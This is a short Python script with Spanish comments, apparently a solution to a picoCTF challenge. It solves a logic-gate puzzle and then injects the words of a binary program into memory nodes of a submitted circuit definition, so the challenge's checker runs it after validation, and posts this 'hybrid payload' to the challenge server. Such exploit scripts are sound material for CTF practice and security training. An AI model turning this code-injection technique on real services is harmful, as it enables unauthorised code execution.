import struct
import requests

# 1. Leer el programa que activa la Flag 2
with open('programs/flag.bin', 'rb') as f:
    flag_bin = f.read()

# Convertir bytes a palabras (16-bit)
words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

# 2. Configurar el circuito:
# - Primero, resolvemos el rompecabezas lógico (NOT gates) para que el binario de validación esté contento.
# - Segundo, inyectamos las instrucciones de flag.bin en una zona de la memoria
#   que el Program Counter (PC) alcance tras la validación.
circuit = []

# Lógica válida (NOT gates)
for i in range(4):
    circuit.append({"input1": 5+i, "input2": 5+i, "output": 1+i})

# Inyección maliciosa (inyectamos el programa de la Flag 2)
# Apuntamos a una zona de memoria que no afecte la lógica (offset 0x0500 / 1280)
for i, val in enumerate(words):
    target_node = 1280 + i 
    circuit.append({"input1": val, "input2": val, "output": target_node})

print("[*] Lanzando payload híbrido para Flag 2...")
url = "http://activist-birds.picoctf.net:57005/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
